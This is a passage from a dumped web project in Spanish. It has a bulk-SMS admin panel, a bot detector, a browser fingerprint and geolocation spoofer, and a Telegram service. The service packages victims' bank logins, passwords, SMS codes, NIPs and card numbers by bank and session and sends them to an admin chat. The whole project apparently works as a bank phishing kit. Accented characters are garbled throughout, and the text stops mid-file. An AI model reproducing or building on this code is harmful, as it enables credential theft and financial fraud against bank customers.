items-center gap-2\">\n            <CheckCircle className=\"h-5 w-5 text-green-500\" />\n            Estado del Sistema SMS\n          </CardTitle>\n          <CardDescription>\n            La API de Sofmex est谩 configurada autom谩ticamente y lista para usar\n          </CardDescription>\n        </CardHeader>\n        <CardContent>\n          <div className=\"flex items-center gap-2\">\n            <Badge variant=\"default\" className=\"bg-green-100 text-green-800\">\n              Activo\n            </Badge>\n            <span className=\"text-sm text-muted-foreground\">\n              Sistema listo para env铆o de mensajes\n            </span>\n          </div>\n        </CardContent>\n      </Card>\n\n      <div className=\"grid gap-6 md:grid-cols-2\">\n        {/* Panel de gesti贸n de cr茅ditos */}\n        <Card>\n          <CardHeader>\n            <CardTitle className=\"flex items-center gap-2\">\n              <CreditCard className=\"h-5 w-5\" />\n              Gesti贸n de Cr茅ditos\n            </CardTitle>\n            <CardDescription>\n              Administra los cr茅ditos SMS de los usuarios\n            </CardDescription>\n          </CardHeader>\n          <CardContent className=\"space-y-4\">\n            <div className=\"space-y-2\">\n              <Label htmlFor=\"user-select\">Seleccionar Usuario</Label>\n              <Select value={selectedUserId?.toString() || \"\"} onValueChange={(value) => setSelectedUserId(parseInt(value))}>\n                <SelectTrigger>\n                  <SelectValue placeholder=\"Selecciona un usuario\" />\n                </SelectTrigger>\n                <SelectContent>\n                  {users.map((user: User) => (\n                    <SelectItem key={user.id} value={user.id.toString()}>\n                      {user.username} ({user.role})\n                    </SelectItem>\n                  ))}\n                </SelectContent>\n              </Select>\n            </div>\n\n            {selectedUserId && (\n              <div className=\"space-y-4\">\n                <div className=\"p-3 bg-muted rounded-lg\">\n                  <div className=\"text-sm font-medium\">Cr茅ditos actuales</div>\n                  <div className=\"text-2xl font-bold\">{userCredits}</div>\n                </div>\n\n                <div className=\"space-y-2\">\n                  <Label htmlFor=\"credits-input\">Cr茅ditos a agregar</Label>\n                  <Input\n                    id=\"credits-input\"\n                    type=\"number\"\n                    min=\"1\"\n                    value={creditsToAdd === 0 ? '' : creditsToAdd}\n                    onChange={(e) => {\n                      const value = e.target.value;\n                      if (value === '' || value === '0') {\n                        setCreditsToAdd(0);\n                      } else {\n                        const numValue = parseInt(value);\n                        if (!isNaN(numValue) && numValue > 0) {\n                          setCreditsToAdd(numValue);\n                        }\n                      }\n                    }}\n                    placeholder=\"Ingresa cantidad (ej: 10)\"\n                  />\n                </div>\n\n                <Button \n                  onClick={handleAddCredits}\n                  disabled={creditsToAdd <= 0 || addCreditsMutation.isPending}\n                  className=\"w-full\"\n                >\n                  <Plus className=\"h-4 w-4 mr-2\" />\n                  {addCreditsMutation.isPending ? 'Agregando...' : 'Agregar Cr茅ditos'}\n                </Button>\n              </div>\n            )}\n          </CardContent>\n        </Card>\n\n        {/* Panel de env铆o de SMS */}\n        <Card>\n          <CardHeader>\n            <CardTitle className=\"flex items-center gap-2\">\n              <MessageSquare className=\"h-5 w-5\" />\n              Env铆o de SMS\n            </CardTitle>\n            <CardDescription>\n              Env铆a mensajes de texto directamente desde el panel\n            </CardDescription>\n          </CardHeader>\n          <CardContent>\n            <Dialog open={isSendSmsDialogOpen} onOpenChange={setIsSendSmsDialogOpen}>\n              <DialogTrigger asChild>\n                <Button className=\"w-full\">\n                  <Send className=\"h-4 w-4 mr-2\" />\n                  Enviar SMS\n                </Button>\n              </DialogTrigger>\n              <DialogContent className=\"max-w-lg\">\n                <DialogHeader>\n                  <DialogTitle>Enviar SMS Masivo</DialogTitle>\n                </DialogHeader>\n                \n                <div className=\"space-y-4\">\n                  {/* Selecci贸n de Ruta */}\n                  <div className=\"space-y-2\">\n                    <Label htmlFor=\"route-select\">Tipo de ruta</Label>\n                    <Select value={routeType} onValueChange={setRouteType}>\n                      <SelectTrigger>\n                        <SelectValue placeholder=\"Selecciona el tipo de ruta\" />\n                      </SelectTrigger>\n                      <SelectContent>\n                        <SelectItem value=\"premium\">\n                          <div className=\"flex justify-between items-center w-full\">\n                            <span>Ruta Premium - eims (1.0 cr茅dito)</span>\n                          </div>\n                        </SelectItem>\n                        <SelectItem value=\"long_code\">\n                          <div className=\"flex justify-between items-center w-full\">\n                            <span>Ruta Econ贸mica (0.5 cr茅ditos)</span>\n                          </div>\n                        </SelectItem>\n                      </SelectContent>\n                    </Select>\n                  </div>\n\n                  {/* Prefijo de Pa铆s */}\n                  <div className=\"space-y-2\">\n                    <Label htmlFor=\"prefix-select\">Prefijo del pa铆s</Label>\n                    <Select value={prefix} onValueChange={setPrefix}>\n                      <SelectTrigger>\n                        <SelectValue />\n                      </SelectTrigger>\n                      <SelectContent>\n                        <SelectItem value=\"+52\">M茅xico (+52)</SelectItem>\n                        <SelectItem value=\"+1\">EE.UU. (+1)</SelectItem>\n                        <SelectItem value=\"+57\">Colombia (+57)</SelectItem>\n                        <SelectItem value=\"+34\">Espa帽a (+34)</SelectItem>\n                      </SelectContent>\n                    </Select>\n                  </div>\n\n                  {/* N煤meros de Tel茅fono */}\n                  <div className=\"space-y-2\">\n                    <Label htmlFor=\"phone-numbers\">N煤meros de tel茅fono</Label>\n                    <Textarea\n                      id=\"phone-numbers\"\n                      value={phoneNumbers}\n                      onChange={(e) => setPhoneNumbers(e.target.value)}\n                      placeholder=\"Ej: 5512345678,5523456789 (m谩ximo 250)\"\n                      rows={3}\n                    />\n                    <p className=\"text-sm text-muted-foreground\">\n                      Separar m煤ltiples n煤meros con comas\n                      {phoneNumbers.trim() && (\n                        <span className=\"font-medium ml-2\">\n                          ({phoneNumbers.split(',').filter(n => n.trim()).length} n煤meros)\n                        </span>\n                      )}\n                    </p>\n                  </div>\n\n                  {/* Mensaje */}\n                  <div className=\"space-y-2\">\n                    <Label htmlFor=\"sms-message\">Mensaje</Label>\n                    <Textarea\n                      id=\"sms-message\"\n                      value={smsMessage}\n                      onChange={(e) => setSmsMessage(e.target.value)}\n                      placeholder=\"Escribe tu mensaje aqu铆...\"\n                      rows={4}\n                      maxLength={160}\n                    />\n                    <div className=\"flex justify-between text-sm text-muted-foreground\">\n                      <span>{smsMessage.length}/160 caracteres</span>\n                      {phoneNumbers.trim() && routeType && (\n                        <span className=\"font-medium\">\n                          Total: {((routeType === 'premium' ? 1.0 : 0.5) * \n                            phoneNumbers.split(',').filter(n => n.trim()).length).toFixed(1)} cr茅ditos\n                        </span>\n                      )}\n                    </div>\n                  </div>\n\n                  <Button \n                    onClick={handleSendSms}\n                    disabled={!phoneNumbers.trim() || !smsMessage.trim() || !routeType || sendSmsMutation.isPending}\n                    className=\"w-full\"\n                  >\n                    {sendSmsMutation.isPending ? 'Enviando...' : 'Enviar SMS'}\n                  </Button>\n                </div>\n              </DialogContent>\n            </Dialog>\n          </CardContent>\n        </Card>\n      </div>\n\n      {/* Historial de SMS */}\n      {selectedUserId && smsHistory.length > 0 && (\n        <Card>\n          <CardHeader>\n            <CardTitle className=\"flex items-center gap-2\">\n              <History className=\"h-5 w-5\" />\n              Historial de SMS\n            </CardTitle>\n            <CardDescription>\n              ltimos mensajes enviados por el usuario seleccionado\n            </CardDescription>\n          </CardHeader>\n          <CardContent>\n            <div className=\"space-y-3\">\n              {smsHistory.slice(0, 5).map((sms: SmsHistory) => (\n                <div key={sms.id} className=\"p-3 bg-muted rounded-lg\">\n                  <div className=\"flex items-center justify-between mb-2\">\n                    <div className=\"font-medium\">{sms.phoneNumber}</div>\n                    <Badge variant={sms.status === 'sent' ? 'default' : 'destructive'}>\n                      {sms.status}\n                    </Badge>\n                  </div>\n                  <div className=\"text-sm text-muted-foreground mb-1\">\n                    {sms.message}\n                  </div>\n                  <div className=\"text-xs text-muted-foreground\">\n                    {new Date(sms.sentAt).toLocaleString()}\n                  </div>\n                  {sms.errorMessage && (\n                    <div className=\"text-xs text-red-600 mt-1\">\n                      Error: {sms.errorMessage}\n                    </div>\n                  )}\n                </div>\n              ))}\n            </div>\n          </CardContent>\n        </Card>\n      )}\n    </div>\n  );\n};\n\nexport default SmsManagementSimple;","size_bytes":15822},"client/src/utils/botDetector.ts":{"content":"// Sistema de detecci贸n de bots para login\nexport class BotDetector {\n  private static behaviorScore = 0;\n  private static interactions: Array<{ type: string; timestamp: number }> = [];\n  private static mouseMovements = 0;\n  private static keyboardPatterns: number[] = [];\n  \n  // Detectar comportamiento de bot\n  public static detectBot(): { isBot: boolean; confidence: number; reasons: string[] } {\n    const reasons: string[] = [];\n    let score = 0;\n    \n    // 1. Verificar propiedades del navegador\n    if (this.checkBrowserAutomation()) {\n      score += 30;\n      reasons.push('Propiedades de automatizaci贸n detectadas');\n    }\n    \n    // 2. Verificar patrones de interacci贸n\n    if (this.checkInteractionPatterns()) {\n      score += 25;\n      reasons.push('Patrones de interacci贸n sospechosos');\n    }\n    \n    // 3. Verificar movimiento del mouse\n    if (this.mouseMovements < 3) {\n      score += 20;\n      reasons.push('Falta de movimiento natural del mouse');\n    }\n    \n    // 4. Verificar timing de teclas\n    if (this.checkKeyboardTiming()) {\n      score += 15;\n      reasons.push('Patrones de tecleo no humanos');\n    }\n    \n    // 5. Verificar caracter铆sticas del navegador\n    if (this.checkBrowserFeatures()) {\n      score += 10;\n      reasons.push('Caracter铆sticas del navegador sospechosas');\n    }\n    \n    return {\n      isBot: score >= 50,\n      confidence: Math.min(score, 100),\n      reasons\n    };\n  }\n  \n  private static checkBrowserAutomation(): boolean {\n    if (typeof window === 'undefined') return false;\n    \n    return !!(\n      (window as any).webdriver ||\n      (window as any).__selenium_unwrapped ||\n      (window as any).__webdriver_evaluate ||\n      (window as any).__selenium_evaluate ||\n      (window as any).__fxdriver_evaluate ||\n      (window as any).__driver_unwrapped ||\n      (window as any).__webdriver_unwrapped ||\n      (window as any).__driver_evaluate ||\n      (window as any).phantom ||\n      (window as any).__nightmare ||\n      (window as any).callPhantom ||\n      (window as any)._phantom\n    );\n  }\n  \n  private static checkInteractionPatterns(): boolean {\n    const now = Date.now();\n    const recentInteractions = this.interactions.filter(i => now - i.timestamp < 10000);\n    \n    if (recentInteractions.length === 0) return true;\n    \n    // Verificar si todas las interacciones son muy r谩pidas\n    const timings = recentInteractions.map((_, i) => {\n      if (i === 0) return 0;\n      return recentInteractions[i].timestamp - recentInteractions[i-1].timestamp;\n    }).filter(t => t > 0);\n    \n    const avgTiming = timings.reduce((a, b) => a + b, 0) / timings.length;\n    return avgTiming < 100; // Menos de 100ms entre interacciones\n  }\n  \n  private static checkKeyboardTiming(): boolean {\n    if (this.keyboardPatterns.length < 3) return false;\n    \n    // Verificar si el timing entre teclas es demasiado uniforme\n    const differences = this.keyboardPatterns.slice(1).map((time, i) => \n      time - this.keyboardPatterns[i]\n    );\n    \n    const avgDiff = differences.reduce((a, b) => a + b, 0) / differences.length;\n    const variance = differences.reduce((sum, diff) => sum + Math.pow(diff - avgDiff, 2), 0) / differences.length;\n    \n    // Si la varianza es muy baja, es probablemente un bot\n    return variance < 100;\n  }\n  \n  private static checkBrowserFeatures(): boolean {\n    if (typeof window === 'undefined') return false;\n    \n    // Verificar caracter铆sticas que suelen estar ausentes en bots\n    const suspiciousFeatures = [\n      !window.navigator.plugins || window.navigator.plugins.length === 0,\n      !window.navigator.languages || window.navigator.languages.length === 0,\n      window.navigator.hardwareConcurrency === 0,\n      !window.screen || window.screen.width === 0 || window.screen.height === 0\n    ];\n    \n    return suspiciousFeatures.filter(Boolean).length >= 2;\n  }\n  \n  // Registrar interacciones del usuario\n  public static recordInteraction(type: string): void {\n    this.interactions.push({\n      type,\n      timestamp: Date.now()\n    });\n    \n    // Mantener solo las 煤ltimas 20 interacciones\n    if (this.interactions.length > 20) {\n      this.interactions = this.interactions.slice(-20);\n    }\n  }\n  \n  public static recordMouseMovement(): void {\n    this.mouseMovements++;\n  }\n  \n  public static recordKeyPress(): void {\n    this.keyboardPatterns.push(Date.now());\n    \n    // Mantener solo los 煤ltimos 10 registros\n    if (this.keyboardPatterns.length > 10) {\n      this.keyboardPatterns = this.keyboardPatterns.slice(-10);\n    }\n  }\n  \n  // Inicializar listeners\n  public static initialize(): void {\n    if (typeof window === 'undefined') return;\n    \n    // Escuchar movimientos del mouse\n    document.addEventListener('mousemove', () => {\n      this.recordMouseMovement();\n    });\n    \n    // Escuchar teclas presionadas\n    document.addEventListener('keydown', () => {\n      this.recordKeyPress();\n    });\n    \n    // Escuchar clics\n    document.addEventListener('click', () => {\n      this.recordInteraction('click');\n    });\n    \n    // Escuchar focus en inputs\n    document.addEventListener('focusin', (e) => {\n      if ((e.target as HTMLElement).tagName === 'INPUT') {\n        this.recordInteraction('input_focus');\n      }\n    });\n  }\n  \n  // Generar reporte detallado\n  public static generateReport(): object {\n    const detection = this.detectBot();\n    \n    return {\n      ...detection,\n      stats: {\n        mouseMovements: this.mouseMovements,\n        interactions: this.interactions.length,\n        keyboardPatterns: this.keyboardPatterns.length,\n        browserFeatures: {\n          userAgent: navigator.userAgent,\n          platform: navigator.platform,\n          language: navigator.language,\n          plugins: navigator.plugins?.length || 0,\n          hardwareConcurrency: navigator.hardwareConcurrency\n        }\n      },\n      timestamp: new Date().toISOString()\n    };\n  }\n  \n  // Reset para nueva sesi贸n\n  public static reset(): void {\n    this.behaviorScore = 0;\n    this.interactions = [];\n    this.mouseMovements = 0;\n    this.keyboardPatterns = [];\n  }\n}","size_bytes":6098},"client/src/components/ui/radio-group.tsx":{"content":"import * as React from \"react\"\nimport * as RadioGroupPrimitive from \"@radix-ui/react-radio-group\"\nimport { Circle } from \"lucide-react\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst RadioGroup = React.forwardRef<\n  React.ElementRef<typeof RadioGroupPrimitive.Root>,\n  React.ComponentPropsWithoutRef<typeof RadioGroupPrimitive.Root>\n>(({ className, ...props }, ref) => {\n  return (\n    <RadioGroupPrimitive.Root\n      className={cn(\"grid gap-2\", className)}\n      {...props}\n      ref={ref}\n    />\n  )\n})\nRadioGroup.displayName = RadioGroupPrimitive.Root.displayName\n\nconst RadioGroupItem = React.forwardRef<\n  React.ElementRef<typeof RadioGroupPrimitive.Item>,\n  React.ComponentPropsWithoutRef<typeof RadioGroupPrimitive.Item>\n>(({ className, ...props }, ref) => {\n  return (\n    <RadioGroupPrimitive.Item\n      ref={ref}\n      className={cn(\n        \"aspect-square h-4 w-4 rounded-full border border-primary text-primary ring-offset-background focus:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50\",\n        className\n      )}\n      {...props}\n    >\n      <RadioGroupPrimitive.Indicator className=\"flex items-center justify-center\">\n        <Circle className=\"h-2.5 w-2.5 fill-current text-current\" />\n      </RadioGroupPrimitive.Indicator>\n    </RadioGroupPrimitive.Item>\n  )\n})\nRadioGroupItem.displayName = RadioGroupPrimitive.Item.displayName\n\nexport { RadioGroup, RadioGroupItem }\n","size_bytes":1467},"resetAdmin.js":{"content":"// Borrar la memoria actual\nlocalStorage.clear();\nconsole.log('LocalStorage limpiado');","size_bytes":87},"client/src/components/ui/select.tsx":{"content":"import * as React from \"react\"\nimport * as SelectPrimitive from \"@radix-ui/react-select\"\nimport { Check, ChevronDown, ChevronUp } from \"lucide-react\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst Select = SelectPrimitive.Root\n\nconst SelectGroup = SelectPrimitive.Group\n\nconst SelectValue = SelectPrimitive.Value\n\nconst SelectTrigger = React.forwardRef<\n  React.ElementRef<typeof SelectPrimitive.Trigger>,\n  React.ComponentPropsWithoutRef<typeof SelectPrimitive.Trigger>\n>(({ className, children, ...props }, ref) => (\n  <SelectPrimitive.Trigger\n    ref={ref}\n    className={cn(\n      \"flex h-10 w-full items-center justify-between rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 [&>span]:line-clamp-1\",\n      className\n    )}\n    {...props}\n  >\n    {children}\n    <SelectPrimitive.Icon asChild>\n      <ChevronDown className=\"h-4 w-4 opacity-50\" />\n    </SelectPrimitive.Icon>\n  </SelectPrimitive.Trigger>\n))\nSelectTrigger.displayName = SelectPrimitive.Trigger.displayName\n\nconst SelectScrollUpButton = React.forwardRef<\n  React.ElementRef<typeof SelectPrimitive.ScrollUpButton>,\n  React.ComponentPropsWithoutRef<typeof SelectPrimitive.ScrollUpButton>\n>(({ className, ...props }, ref) => (\n  <SelectPrimitive.ScrollUpButton\n    ref={ref}\n    className={cn(\n      \"flex cursor-default items-center justify-center py-1\",\n      className\n    )}\n    {...props}\n  >\n    <ChevronUp className=\"h-4 w-4\" />\n  </SelectPrimitive.ScrollUpButton>\n))\nSelectScrollUpButton.displayName = SelectPrimitive.ScrollUpButton.displayName\n\nconst SelectScrollDownButton = React.forwardRef<\n  React.ElementRef<typeof SelectPrimitive.ScrollDownButton>,\n  React.ComponentPropsWithoutRef<typeof SelectPrimitive.ScrollDownButton>\n>(({ className, ...props }, ref) => (\n  <SelectPrimitive.ScrollDownButton\n    ref={ref}\n    className={cn(\n      \"flex cursor-default items-center justify-center py-1\",\n      className\n    )}\n    {...props}\n  >\n    <ChevronDown className=\"h-4 w-4\" />\n  </SelectPrimitive.ScrollDownButton>\n))\nSelectScrollDownButton.displayName =\n  SelectPrimitive.ScrollDownButton.displayName\n\nconst SelectContent = React.forwardRef<\n  React.ElementRef<typeof SelectPrimitive.Content>,\n  React.ComponentPropsWithoutRef<typeof SelectPrimitive.Content>\n>(({ className, children, position = \"popper\", ...props }, ref) => (\n  <SelectPrimitive.Portal>\n    <SelectPrimitive.Content\n      ref={ref}\n      className={cn(\n        \"relative z-50 max-h-96 min-w-[8rem] overflow-hidden rounded-md border bg-popover text-popover-foreground shadow-md data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2\",\n        position === \"popper\" &&\n          \"data-[side=bottom]:translate-y-1 data-[side=left]:-translate-x-1 data-[side=right]:translate-x-1 data-[side=top]:-translate-y-1\",\n        className\n      )}\n      position={position}\n      {...props}\n    >\n      <SelectScrollUpButton />\n      <SelectPrimitive.Viewport\n        className={cn(\n          \"p-1\",\n          position === \"popper\" &&\n            \"h-[var(--radix-select-trigger-height)] w-full min-w-[var(--radix-select-trigger-width)]\"\n        )}\n      >\n        {children}\n      </SelectPrimitive.Viewport>\n      <SelectScrollDownButton />\n    </SelectPrimitive.Content>\n  </SelectPrimitive.Portal>\n))\nSelectContent.displayName = SelectPrimitive.Content.displayName\n\nconst SelectLabel = React.forwardRef<\n  React.ElementRef<typeof SelectPrimitive.Label>,\n  React.ComponentPropsWithoutRef<typeof SelectPrimitive.Label>\n>(({ className, ...props }, ref) => (\n  <SelectPrimitive.Label\n    ref={ref}\n    className={cn(\"py-1.5 pl-8 pr-2 text-sm font-semibold\", className)}\n    {...props}\n  />\n))\nSelectLabel.displayName = SelectPrimitive.Label.displayName\n\nconst SelectItem = React.forwardRef<\n  React.ElementRef<typeof SelectPrimitive.Item>,\n  React.ComponentPropsWithoutRef<typeof SelectPrimitive.Item>\n>(({ className, children, ...props }, ref) => (\n  <SelectPrimitive.Item\n    ref={ref}\n    className={cn(\n      \"relative flex w-full cursor-default select-none items-center rounded-sm py-1.5 pl-8 pr-2 text-sm outline-none focus:bg-accent focus:text-accent-foreground data-[disabled]:pointer-events-none data-[disabled]:opacity-50\",\n      className\n    )}\n    {...props}\n  >\n    <span className=\"absolute left-2 flex h-3.5 w-3.5 items-center justify-center\">\n      <SelectPrimitive.ItemIndicator>\n        <Check className=\"h-4 w-4\" />\n      </SelectPrimitive.ItemIndicator>\n    </span>\n\n    <SelectPrimitive.ItemText>{children}</SelectPrimitive.ItemText>\n  </SelectPrimitive.Item>\n))\nSelectItem.displayName = SelectPrimitive.Item.displayName\n\nconst SelectSeparator = React.forwardRef<\n  React.ElementRef<typeof SelectPrimitive.Separator>,\n  React.ComponentPropsWithoutRef<typeof SelectPrimitive.Separator>\n>(({ className, ...props }, ref) => (\n  <SelectPrimitive.Separator\n    ref={ref}\n    className={cn(\"-mx-1 my-1 h-px bg-muted\", className)}\n    {...props}\n  />\n))\nSelectSeparator.displayName = SelectPrimitive.Separator.displayName\n\nexport {\n  Select,\n  SelectGroup,\n  SelectValue,\n  SelectTrigger,\n  SelectContent,\n  SelectLabel,\n  SelectItem,\n  SelectSeparator,\n  SelectScrollUpButton,\n  SelectScrollDownButton,\n}\n","size_bytes":5615},"client/src/components/ui/switch.tsx":{"content":"import * as React from \"react\"\nimport * as SwitchPrimitives from \"@radix-ui/react-switch\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst Switch = React.forwardRef<\n  React.ElementRef<typeof SwitchPrimitives.Root>,\n  React.ComponentPropsWithoutRef<typeof SwitchPrimitives.Root>\n>(({ className, ...props }, ref) => (\n  <SwitchPrimitives.Root\n    className={cn(\n      \"peer inline-flex h-6 w-11 shrink-0 cursor-pointer items-center rounded-full border-2 border-transparent transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:ring-offset-background disabled:cursor-not-allowed disabled:opacity-50 data-[state=checked]:bg-primary data-[state=unchecked]:bg-input\",\n      className\n    )}\n    {...props}\n    ref={ref}\n  >\n    <SwitchPrimitives.Thumb\n      className={cn(\n        \"pointer-events-none block h-5 w-5 rounded-full bg-background shadow-lg ring-0 transition-transform data-[state=checked]:translate-x-5 data-[state=unchecked]:translate-x-0\"\n      )}\n    />\n  </SwitchPrimitives.Root>\n))\nSwitch.displayName = SwitchPrimitives.Root.displayName\n\nexport { Switch }\n","size_bytes":1139},"client/src/hooks/use-media-query.ts":{"content":"import { useEffect, useState } from 'react';\n\nexport function useMediaQuery(query: string): boolean {\n  const [matches, setMatches] = useState(false);\n\n  useEffect(() => {\n    const mediaQuery = window.matchMedia(query);\n    setMatches(mediaQuery.matches);\n\n    const handleChange = (event: MediaQueryListEvent) => {\n      setMatches(event.matches);\n    };\n\n    mediaQuery.addEventListener('change', handleChange);\n    return () => {\n      mediaQuery.removeEventListener('change', handleChange);\n    };\n  }, [query]);\n\n  return matches;\n}","size_bytes":538},"client/src/utils/fingerprint.ts":{"content":"// Utilidades para generar fingerprints 煤nicos y ofuscar identidad del navegador\nexport class FingerprintObfuscator {\n  private static instance: FingerprintObfuscator;\n  private fingerprint: string;\n  \n  private constructor() {\n    this.fingerprint = this.generateObfuscatedFingerprint();\n  }\n  \n  public static getInstance(): FingerprintObfuscator {\n    if (!FingerprintObfuscator.instance) {\n      FingerprintObfuscator.instance = new FingerprintObfuscator();\n    }\n    return FingerprintObfuscator.instance;\n  }\n  \n  private generateObfuscatedFingerprint(): string {\n    // Generar datos falsos para fingerprinting\n    const fakeScreen = {\n      width: [1920, 1366, 1440, 1536][Math.floor(Math.random() * 4)],\n      height: [1080, 768, 900, 864][Math.floor(Math.random() * 4)],\n      colorDepth: [24, 32][Math.floor(Math.random() * 2)],\n      pixelDepth: [24, 32][Math.floor(Math.random() * 2)]\n    };\n    \n    const fakeTimezone = [\n      'America/Mexico_City',\n      'America/New_York',\n      'Europe/Madrid',\n      'America/Los_Angeles'\n    ][Math.floor(Math.random() * 4)];\n    \n    const fakeLanguages = [\n      ['es-ES', 'es', 'en'],\n      ['es-MX', 'es', 'en'],\n      ['en-US', 'en', 'es'],\n      ['es', 'en']\n    ][Math.floor(Math.random() * 4)];\n    \n    // Combinar datos falsos para crear fingerprint 煤nico\n    const data = [\n      fakeScreen.width,\n      fakeScreen.height,\n      fakeScreen.colorDepth,\n      fakeTimezone,\n      fakeLanguages.join(','),\n      Math.random().toString(36).substring(7)\n    ].join('|');\n    \n    return btoa(data).substring(0, 32);\n  }\n  \n  public getFingerprint(): string {\n    return this.fingerprint;\n  }\n  \n  public refreshFingerprint(): string {\n    this.fingerprint = this.generateObfuscatedFingerprint();\n    return this.fingerprint;\n  }\n  \n  // Ofuscar WebRTC para evitar leak de IP real\n  public obfuscateWebRTC(): void {\n    if (typeof window !== 'undefined' && window.RTCPeerConnection) {\n      const originalRTC = window.RTCPeerConnection;\n      window.RTCPeerConnection = class extends originalRTC {\n        constructor(config?: RTCConfiguration) {\n          // Forzar uso de servidores TURN/STUN falsos\n          const obfuscatedConfig = {\n            ...config,\n            iceServers: [\n              { urls: 'stun:stun.example.com:19302' },\n              { urls: 'turn:turn.example.com:3478', username: 'user', credential: 'pass' }\n            ]\n          };\n          super(obfuscatedConfig);\n        }\n      };\n    }\n  }\n  \n  // Ofuscar geolocalizaci贸n\n  public obfuscateGeolocation(): void {\n    if (typeof window !== 'undefined' && navigator.geolocation) {\n      const originalGetCurrentPosition = navigator.geolocation.getCurrentPosition;\n      navigator.geolocation.getCurrentPosition = function(success, error, options) {\n        // Simular ubicaci贸n falsa\n        const fakePosition = {\n          coords: {\n            latitude: 19.4326 + (Math.random() - 0.5) * 0.1,\n            longitude: -99.1332 + (Math.random() - 0.5) * 0.1,\n            accuracy: Math.random() * 100 + 10,\n            altitude: null,\n            altitudeAccuracy: null,\n            heading: null,\n            speed: null\n          },\n          timestamp: Date.now()\n        };\n        \n        if (success) {\n          success(fakePosition as GeolocationPosition);\n        }\n      };\n    }\n  }\n  \n  // Ofuscar battery API\n  public obfuscateBattery(): void {\n    if (typeof window !== 'undefined' && 'getBattery' in navigator) {\n      const originalGetBattery = (navigator as any).getBattery;\n      (navigator as any).getBattery = function() {\n        return Promise.resolve({\n          charging: Math.random() > 0.5,\n          chargingTime: Math.random() * 7200,\n          dischargingTime: Math.random() * 28800,\n          level: Math.random()\n        });\n      };\n    }\n  }\n  \n  // Inicializar todas las ofuscaciones\n  public initializeObfuscation(): void {\n    this.obfuscateWebRTC();\n    this.obfuscateGeolocation();\n    this.obfuscateBattery();\n    \n    // Ofuscar propiedades del navegador\n    if (typeof window !== 'undefined') {\n      // Ocultar automation flags\n      Object.defineProperty(navigator, 'webdriver', {\n        get: () => undefined,\n        configurable: true\n      });\n      \n      Object.defineProperty(window, 'chrome', {\n        get: () => ({\n          runtime: {},\n          webstore: {},\n          csi: () => {},\n          loadTimes: () => {}\n        }),\n        configurable: true\n      });\n      \n      // Falsificar plugins\n      Object.defineProperty(navigator, 'plugins', {\n        get: () => ({\n          length: Math.floor(Math.random() * 5) + 3,\n          item: () => null,\n          namedItem: () => null,\n          refresh: () => {}\n        }),\n        configurable: true\n      });\n    }\n  }\n}","size_bytes":4777},"server/telegramService.ts":{"content":"import TelegramBot from 'node-telegram-bot-api';\n\nconst TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;\nconst ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;\n\nif (!TELEGRAM_TOKEN || !ADMIN_CHAT_ID) {\n  console.warn('[Telegram Service] TELEGRAM_TOKEN y ADMIN_CHAT_ID no est谩n configurados. Las notificaciones de Telegram estar谩n deshabilitadas.');\n}\n\n// Crear instancia del bot solo si hay token\nconst bot = TELEGRAM_TOKEN ? new TelegramBot(TELEGRAM_TOKEN, { polling: false }) : null;\n\nexport interface TelegramNotificationData {\n  sessionId: string;\n  banco: string;\n  tipo: string;\n  data: any;\n  deviceInfo?: {\n    type?: string;\n    model?: string;\n    browser?: string;\n    os?: string;\n  };\n  timestamp: string;\n  createdBy?: string;\n}\n\n// Funci贸n para formatear la informaci贸n del dispositivo\nfunction formatDeviceInfo(deviceInfo?: { type?: string; model?: string; browser?: string; os?: string; }): string {\n  if (!deviceInfo || !deviceInfo.type) return '';\n  \n  const deviceEmoji = deviceInfo.type === 'Android' ? '' : \n                     deviceInfo.type === 'iPhone' ? '' : '';\n  \n  let deviceText = `\\n *Dispositivo:* ${deviceEmoji} ${deviceInfo.type}`;\n  \n  if (deviceInfo.model) {\n    deviceText += `\\n *Modelo:* ${deviceInfo.model}`;\n  }\n  \n  if (deviceInfo.browser) {\n    deviceText += `\\n *Navegador:* ${deviceInfo.browser}`;\n  }\n  \n  if (deviceInfo.os) {\n    deviceText += `\\n锔 *Sistema:* ${deviceInfo.os}`;\n  }\n  \n  return deviceText;\n}\n\n// Funci贸n para formatear el mensaje seg煤n el tipo de dato\nfunction formatMessage(data: TelegramNotificationData): string {\n  const { sessionId, banco, tipo, data: inputData, deviceInfo, timestamp, createdBy } = data;\n  \n  let message = ` *NUEVA INFORMACIN RECIBIDA*\\n\\n`;\n  message += ` *Banco:* ${banco}\\n`;\n  message += ` *Sesi贸n:* ${sessionId}\\n`;\n  message += ` *Creado por:* ${createdBy || 'Desconocido'}\\n`;\n  message += ` *Hora:* ${new Date(timestamp).toLocaleString('es-MX', { timeZone: 'America/Mexico_City' })}\\n`;\n  \n  // Agregar informaci贸n del dispositivo si est谩 disponible\n  if (deviceInfo) {\n    message += formatDeviceInfo(deviceInfo);\n  }\n  \n  message += `\\n\\n *Tipo de informaci贸n:* ${tipo.toUpperCase()}\\n`;\n  \n  switch (tipo.toLowerCase()) {\n    case 'folio':\n      message += ` *Folio ingresado:* \\`${inputData.folio || 'N/A'}\\``;\n      break;\n      \n    case 'login':\n      message += ` *Usuario:* \\`${inputData.username || 'N/A'}\\`\\n`;\n      message += ` *Contrase帽a:* \\`${inputData.password || 'N/A'}\\``;\n      break;\n      \n    case 'codigo':\n    case 'sms':\n      message += ` *C贸digo SMS:* \\`${inputData.codigo || inputData.sms || 'N/A'}\\``;\n      break;\n      \n    case 'nip':\n      message += ` *NIP:* \\`${inputData.nip || 'N/A'}\\``;\n      break;\n      \n    case 'tarjeta':\n      message += ` *N煤mero de tarjeta:* \\`${inputData.tarjeta || 'N/A'}\\`\\n`;\n      if 